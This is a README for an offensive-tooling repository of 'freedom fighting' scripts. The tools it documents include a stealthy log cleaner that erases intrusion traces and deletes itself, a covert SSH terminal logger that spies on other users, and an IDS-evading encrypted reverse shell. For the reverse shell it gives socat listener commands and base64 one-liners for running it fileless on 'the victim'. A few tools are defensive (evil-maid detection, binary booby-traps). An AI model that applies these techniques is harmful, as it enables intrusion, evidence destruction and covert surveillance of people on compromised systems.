# Freedom Fighting scripts

This repository contains scripts which may come in handy during your freedom fighting activities. It will be updated
occasionally, when I find myself in need of something I can't find online.
Everything here is distributed under the terms of the [GPL v3 License](https://www.gnu.org/licenses/gpl.html).

Contributions and pull requests are very welcome.

## Table of Contents

- [nojail.py](#nojailpy), a python log cleaner.
- [share.sh](#sharesh), a secure file sharing script.
- [autojack.py](#autojackpy), a term logger.
- [listurl.py](#listurlpy), a site mapper.
- [ersh.py](#ershpy), an encrypted reverse shell.
- [boot_check.py](#boot_checkpy), a script to detect evil-maid attacks.
- [notify_hook.py](#notify_hookpy), a way to trigger alerts when some binaries are called on a system.
- [Miscellaneous](#miscellaneous) (contact and donations)

## nojail.py

A log cleaner which removes incriminating entries in:

* `/var/run/utmp`, `/var/log/wtmp`, `/var/log/btmp` (controls the output of the `who`, `w` and `last` commands)
* `/var/log/lastlog` (controls the output of the `lastlog` command)
* `/var/**/*.log` (.log.1, .log.2.gz, etc. included)
* Any additional file or folder designated by the user

Entries are deleted based on an IP address and/or associated hostname.

Special care is taken to avoid breaking file descriptors while tampering with logs. This means logs continue to be
written to after they've been tampered with, making the cleanup a lot less conspicuous. All the work takes place in a
*tmpfs* drive and any files created are wiped securely.

**Warning:** The script has only been tested on Linux and will not be able to clean UTMP entries on other Unix flavors.

### Usage:
```
usage: nojail.py [-h] [--user USER] [--ip IP] [--hostname HOSTNAME]
                    [--verbose] [--check]
                    [log_files [log_files ...]]

   Stealthy log file cleaner.

   positional arguments:
     log_files             Specify any log files to clean in addition to
                           /var/**/*.log.

   optional arguments:
     -h, --help            show this help message and exit
     --user USER, -u USER  The username to remove from the connexion logs.
     --ip IP, -i IP        The IP address to remove from the logs.
     --hostname HOSTNAME   The hostname of the user to wipe. Defaults to the rDNS
                           of the IP.
     --regexp REGEXP, -r REGEXP
                           A regular expression to select log lines to delete
                           (optional)

     --verbose, -v         Print debug messages.
     --check, -c           If present, the user will be asked to confirm each
                           deletion from the logs.
     --daemonize, -d       Start in the background and delete logs when the
                           current session terminates. Implies --self-delete.
     --self-delete, -s     Automatically delete the script after its execution.
```

By default, if no arguments are given, the script will try to determine the IP address to scrub based on the
`SSH_CONNECTION` environment variable. Any entry matching the reverse DNS of that IP will be removed as well.

#### Basic example:

```
./nojail.py --user root --ip 151.80.119.32 /etc/app/logs/access.log --check
```
...will remove all entries for the user root where the IP address is 151.80.119.32 or the hostame is `manalyzer.org`.
The user will also be prompted before deleting each record because of the `--check` option. Finally, the file
`/etc/app/logs/access.log` will be processed in addition to all the default ones.

If folders are given as positional arguments (`/etc/app/logs/` for instance), the script will recursively crawl them and
clean any file with the `.log` extension (*.log.1, *.log.2.gz, etc. included).

#### Regular expressions

You may want to remove arbitrary lines from the log file as well. To do so, use the `--regexp` option. For example,
the following command line will look for all POST requests to PHP files from the specified IP:

```
./nojail.py --ip 151.80.119.32 --regexp "POST /.*?\.php"
```

#### Daemonizing the script

```
./nojail.py --daemonize
```
Assuming this is run from an SSH connexion, this command will delete all logs pertaining to the current user's activity
with the detected IP address and hostname right after the connexion is closed. This script will subsequently
automatically delete itself.
Please bear in mind that you won't have any opportunity to receive error messages from the application. You are encouraged
to try deleting the logs once before spawning the demon to make sure that the arguments you specified are correct.
If you are in a shell with no TTY, the script will not be able to detect when the session ends. You will
be notified that the logs will be deleted in 60 seconds, and that you should log out before then (or risk creating more
entries after the script has run).

### Sample output:
```
root@proxy:~# ./nojail.py
[ ] Cleaning logs for root (XXX.XXX.XXX.XXX - domain.com).
[*] 2 entries removed from /var/run/utmp!
[*] 4 entries removed from /var/log/wtmp!
[ ] No entries to remove from /var/log/btmp.
[*] Lastlog set to 2017-01-09 17:12:49 from pts/0 at lns-bzn-XXX-XXX-XXX-XXX-XXX.adsl.proxad.net
[*] 4 lines removed from /var/log/nginx/error.log!
[*] 11 lines removed from /var/log/nginx/access.log!
[*] 4 lines removed from /var/log/auth.log!
```

### Disclaimer
This script is provided without any guarantees.
Don't blame me it doesn't wipe all traces of something you shouldn't have done in the first place.

## share.sh

A portable and secure file sharing script. While freedom fighting, it is generally not possible to scp files into
compromised machines. Alternate ways to upload files are needed, but most sharing services are either too restrictive
or do not provide a way to retrieve files easily from the command line. Security considerations may also prevent
people from uploading sensitive files to cloud providers for fear that they will keep a copy of it forever.

This small and portable bash script relies on [transfer.sh](https://transfer.sh) to solve that problem. It...
* Encrypts files before uploading them (symmetric AES-256-CBC).
* Automatically uses `torify` if it is present on the system for increased anonimity.

The only dependencies needed are `openssl` and either `curl` or `wget`.

### Usage

```
root@proxy:~# ./share.sh ~/file_to_share "My_Secure_Encryption_Key!"
Success! Retrieval command: ./share.sh -r file_to_share "My_Secure_Encryption_Key!" https://transfer.sh/BQPFz/28239
root@proxy:~# ./share.sh -r file_to_share "My_Secure_Encryption_Key!" https://transfer.sh/BQPFz/28239
File retrieved successfully!
```

Additional arguments during the upload allow you to control the maximum number of downloads allowed for the file (`-m`)
and how many days transfer.sh will keep it (`-d`). The default value for both these options is 1.

**Warning**: Do not use spaces in the encryption key, or only the first word of your passphrase will be taken into
account. This is due to the way `getopts` handles arguments (I think). Pull requests are welcome if anyone is interested in
fixing this.

## autojack.py

AutoJack is a short script leveraging EmptyMonkey's [shelljack](https://github.com/emptymonkey/shelljack) to log the 
terminal of any user connecting through SSH. It watches ```auth.log``` for successful
connections, figures out the PID of the user's ```bash``` process,and leaves the rest to 
```shelljack```.
 
Launch it in a _screen_, and wait until other users log-in. Their session will be
logged to ```/root/.local/sj.log.[user].[timestamp]```.
 
The script is not particularly stealthy (no attempt is made to hide the ```shelljack``` process) but it
will get the job done. Note that to avoid self-incrimination, the ```root``` user is not 
targeted (this can be trivially commented out in the code).

## listurl.py

ListURL is a multi-threaded website crawler which obtains a list of available pages from the target. This script is 
useful for bug-bounty hunters trying to establish the attack surface of a web application.

```
usage: listurl.py [-h] [--max-depth MAX_DEPTH] [--threads THREADS] [--url URL]
                  [--external] [--subdomains] [-c COOKIE]
                  [--exclude-regexp EXCLUDE_REGEXP]
                  [--show-regexp SHOW_REGEXP] [--verbose]

Map a website by recursively grabbing all its URLs.

optional arguments:
  -h, --help            show this help message and exit
  --max-depth MAX_DEPTH, -m MAX_DEPTH
                        The maximum depth to crawl (default is 3).
  --threads THREADS, -t THREADS
                        The number of threads to use (default is 10).
  --url URL, -u URL     The page to start from.
  --external, -e        Follow external links (default is false).
  --subdomains, -d      Include subdomains in the scope (default is false).
  -c COOKIE, --cookie COOKIE
                        Add a cookies to the request. May be specified
                        multiple times.Example: -c "user=admin".
  --exclude-regexp EXCLUDE_REGEXP, -r EXCLUDE_REGEXP
                        A regular expression matching URLs to ignore. The
                        givenexpression doesn't need to match the whole URL,
                        only a partof it.
  --show-regexp SHOW_REGEXP, -s SHOW_REGEXP
                        A regular expression filtering displayed results. The
                        given expression is searched inside the results, it
                        doesn't have tomatch the whole URL. Example: \.php$
  --no-certificate-check, -n
                        Disables the verification of SSL certificates.
  --output-file OUTPUT_FILE, -o OUTPUT_FILE
                        The file into which the obtained URLs should be
                        written
  --verbose, -v         Be more verbose. Can be specified multiple times.
```

Here is the sample output for a small website:

```
./listurl.py -u https://manalyzer.org
[*] Started crawling at depth 1.
[*] Started crawling at depth 2....
[*] Started crawling at depth 3.
[*] URLs discovered:
https://manalyzer.org/report/f32d9d9ff788998234fe2b542f61ee2c (GET)
https://manalyzer.org/report/eb4d2382c25c887ebc7775d56c417c6a (GET)
https://manalyzer.org/report/ca127ebd958b98c55ee4ef277a1d3547 (GET)
https://manalyzer.org/upload (POST)
https://manalyzer.org/report/dd6762a2897432fdc7406fbd2bc2fe18 (GET)
https://manalyzer.org/report/2fba831cab210047c7ec651ebdf63f50 (GET)
https://manalyzer.org/report/029284d88f7b8586059ddcc71031c1f1 (GET)
https://manalyzer.org/ (GET)
https://manalyzer.org/report/83f3c2b72e3b98e2a72ae5fdf92c164e (GET)
https://manalyzer.org/report/1bf9277cc045362472d1ba55e4d31dd5 (GET)
https://manalyzer.org/report/af09bf587303feb4a9e9088b17631254 (GET)
https://manalyzer.org/report/508d8094be65eaae4d481d40aacb2925 (GET)
https://manalyzer.org/report/0e8592aa78d6e5a14043ab466601ef9b (GET)
https://manalyzer.org/report/b52ddc0dda64f35721d5692e168ad58c (GET)
https://manalyzer.org (GET)
https://manalyzer.org/bounty (GET)
https://manalyzer.org/search (POST)
```

### Filtering results

The ``--exclude-regexp`` and ``--show-regexp`` options are used to control which 
URLs should be shown or ignored. For instance, in the example above, you may want
to ignore pages which are likely to be very similar: 

```
./listurl.py -u https://manalyzer.org --exclude-regexp "/report/"
   [*] Started crawling at depth 1.
   [*] Started crawling at depth 2...
   [*] Started crawling at depth 3.
   [*] URLs discovered:
   https://manalyzer.org (GET)
   https://manalyzer.org/bounty (GET)
   https://manalyzer.org/upload (POST)
   https://manalyzer.org/search (POST)
   https://manalyzer.org/ (GET)
```

Note that the matching URLs will *not* be crawled. This is particularly useful
when the script gets lost in deep comment pages or repetitive content. Alternately, 
you may only be interested in PHP scripts: ``./listurl.py --show-regexp "\.php$"``.

### Crawl parameters

By default, the crawler only goes 3 levels deep. This is something you can control
with the ``--max-depth`` option.

Another consideration is whether URLs pointing to external domains should be followed.
By default, the script doesn't, but you can enable this by setting the ``--external``
switch. If you're not interested in random external domains but still want to extend
the crawl to subdomains, you can set the ``--subdomains`` switch:

```
./listurl.py -u https://google.com --subdomains
[*] Started crawling at depth 1.
[*] Started crawling at depth 2.^C
Interrupt caught! Please wait a few seconds while the threads shut down...
[*] URLs discovered:
https://drive.google.com/drive/ (GET)
https://google.com/../../policies/privacy/example/phone-number.html (GET)
https://play.google.com/store/books/details/Markus_Heitz_Le_Secret_de_l_eau_noire?id=Oh1rDgAAQBAJ (GET)
https://play.google.com/store/books/details/Leslie_Kelly_Face_au_d%C3%A9sir?id=mUtyDAAAQBAJ (GET)
https://mail.google.com/mail/?tab=Tm (GET)
https://google.com/../../policies/privacy/example/your-activity-on-other-sites-and-apps.html (GET)
https://google.com/locations/ (GET)
[...]
```

Notice that if the script takes too long, you can hit CTRL+C anytime to shut
it down. You'll then be shown the pages discovered so far.

If you need to access authenticated pages on a website, you can provide
cookies to listurl.py from the command line with the ``--cookie`` option.

Finally, if you're working on a website which has an invalid or self-signed SSL 
certificate, use the `--no-certificate-check` option to ignore SSL errors.

## ersh.py

```ersh``` is an encrypted reverse shell written in pure Python. Ever been on a
box with no standard utilities or compilation tools, and no easy way to upload
binaries? Are you afraid than an IDS will notice an outbound shell? Accidentally
closed your netcat listener because you pressed ```^C```?
Suffer no more.

```ersh``` offers the following features:

- SSL-encrypted with both client and server authentication (SSL as in Suck-it Snort Layer).
- Fully featured TTY.
- Optionnaly file-less.
- No dependencies, should run on any machine with Python >= 2.6.

For a more detailed discussion about how this tool came to be, please refer to
this [blog post](https://blog.kwiatkowski.fr/?q=en/ersh).

### Usage

This script **needs to be edited** before it works! Look for this marker near
the beginning:

```
###############################################################################
# EDIT THE PARAMETERS BELOW THIS LINE
###############################################################################
```

The ```HOST``` and ```PORT``` are self-explanatory, but you may need additional help
for the SSL certificates. Nobody wants to fight against OpenSSL's client however, so
you can just use the following one-liners:

```
openssl req -new -newkey rsa:2048 -days 50 -nodes -x509 -subj "/C=US/ST=Maryland/L=Fort Meade/O=NSA/CN=www.nsa.gov" -keyout server.key -out server.crt && cat server.key server.crt > server.pem && openssl dhparam 2048 >> server.pem
openssl req -new -newkey rsa:2048 -days 50 -nodes -x509 -subj "/C=US/ST=Maryland/L=Fort Meade/O=NSA/CN=www.nsa.gov" -keyout client.key -out client.crt
```

That's it! You should now have five new files in your current folder: ```server.(crt|key|pem)```
and ```client.(crt|key)```. Some of them need to be inserted in the script so
the reverse shell and the listener can authenticate each other. Specifically:

- ```client_key``` should contain the contents of ```client.key```.
- ```client_crt``` should contain the contents of ```client.crt```.
- ```server_crt``` should contain the contents of ```server.crt```.

That's it, no more editing required.

### Setting up the listener

Considering that a full TLS negociation is going to proceed, a traditional ```nc``` listener
will not suffice here. ```socat``` has been chosen for this task, due to its ability to
handle encryption and TTYs. On Debian-based distributions, you should be able to obtain
it by simply running ```sudo apt-get install socat```.

Assuming you're still in the folder where you generated the keys and certificates, and
you want to listen on port 443, here is the command line you should run on the
machine where the reverse shell will arrive:

```
socat openssl-listen:443,reuseaddr,cert=server.pem,cafile=client.crt,method=TLS1 file:`tty`,raw,echo=0
```

### Running from memory

You don't need to copy the script to the remote machine for it to work. Here is a simple way to run it
from a non-interactive shell. Copy the whole script to your clipboard and run the following commands on
the victim:

```
python - <<'EOF'
[paste script contents here]
'EOF'
```

If you're trying to launch ```ersh.py``` from an environment which doesn't support multiple lines (such
as Weevely), you can also try generating a one-liner like this:

```
root@attacker:~/freedomfighting# gzip -c ersh.py | base64
H4sICPMsblkAA2UucHkA1Vp5k6O4kv+fT8FUx8RULdU2PsB27asXCxh8Ajbgs2eiHocwmNMcxvjT
r4Rdd0/PvNiZjV0iqgxSKpXK45cpxJef6nma1A03rMdl5kQhdnNzg4EkdWpxiRsl/l/jPM1cEyj6
[...]

weevely> echo "H4sICPMsblkAA2..." | base64 -d | gunzip | python
```

### Sample output

On the receiver machine:

```
root@attacker:~/freedomfighting# socat openssl-listen:8080,reuseaddr,cert=server.pem,cafile=client.crt,method=TLS1 file:`tty`,raw,echo=0
```

On the victim:

```
root@victim:~# python ersh.py
[*] Connection established!
root@victim:~#
```

And on the receiver again:

```
root@attacker:~/freedomfighting# socat openssl-listen:8080,reuseaddr,cert=server.pem,cafile=client.crt,method=TLS1 file:`tty`,raw,echo=0
root@victim:~# unset HISTFILE
root@victim:~#
```

## boot_check.py

This script was written to detect evil maid attacks. It does so by checking at
boot time if the hard drive was powered on but not the OS (for instance, if it
was taken out of the computer for a copy, or if someone tried to boot the
machine but was stopped by a FDE password).

### Installation:

You need to make sure this script will run at every boot. The following
instructions will work on distributions using systemd.

* Copy boot_check.service to `/etc/systemd/system/`. Fix paths inside of it as needed.
   The script will run as root so make sure it is not world writable!
* `#> systemctl enable boot_check.service`

Install dependencies:

* `#> apt install smartmontools dialog`

Run the script once so it initializes:

* `#> ./boot_check.py`

If a confirmation message appears, you're good to go.

### Testing

If you want to make sure that the script works, make sure you do the following:
- Do not just reboot the computer, as the power to the hard drive may not be cut. 
Turn it off completely.
- If you don't want to take out your drive and plug it into another machine, you
can try interrupting the boot process. This has to happen before the script is 
executed, but after the drive has been powered on (which means after the BIOS
password). A good moment to interrupt the boot process is when the prompt for the
FDE password is shown.
- Then turn on the computer again, and you should see the alert on your screen
a few seconds after your computer has booted up.

## notify_hook.py

This script was created to provide a simple way to "booby-trap" certain 
executables on a linux system. The idea is to detect intruders when they use
certain binaries (`id`, `whoami`, `gcc`) on a server they don't own.

To protect those binaries, `notify_hook.py` create symbolic links to this 
script higher-up in the `PATH`. `notify_hook` will then send you an alert
and call the intended program in a transparent fashion. For instance, if
you want to "protect" `id`, just create the following symlink on your machine:

```
ln -s path/to/notify_hook.py /usr/local/bin/id
```

...and all future calls to `id` should be routed through this script. This
is obviously not a foolproof way to detect hackers on your systems, but it
should nonetheless catch the most careless intruders.

### Customization

Some programs and scripts on your system may regularly invoke some of the
binaries you wish to protect. In that case, you can edit a variable called 
`CALLER_WHITELIST` placed at the beginning of the script. Put the name of
those processes in the list to disable alerts from them (regular expressions
are accepted).

The current notification method implemented in this script is a text message
sent thtough Signal with AsamK's 
[signal-cli](https://github.com/AsamK/signal-cli). You'll need to install this
project separately if you want to use it, or, more likely, replace the 
`notify_callback` function placed on top of `notify_hook.py` with whatever
suits your needs.

## Miscellaneous

### Donations
These scripts are 100% free. I do like Bitcoins though, so if you want to send 
some my way, here's an address you can use: ```1PUeq8FfyqvyJqA1Eb23qHrnkdPknt4aKF```
Feel free to drop me a line if you donate to the project, so I can thank you personally!

### Contact
[![](https://manalyzer.org/static/mail.png)](justicerage@manalyzer[.]org)
[![](https://manalyzer.org/static/twitter.png)](https://twitter.com/JusticeRage)
[![](https://manalyzer.org/static/gpg.png)](https://pgp.mit.edu/pks/lookup?op=vindex&search=0x40E9F0A8F5EA8754)
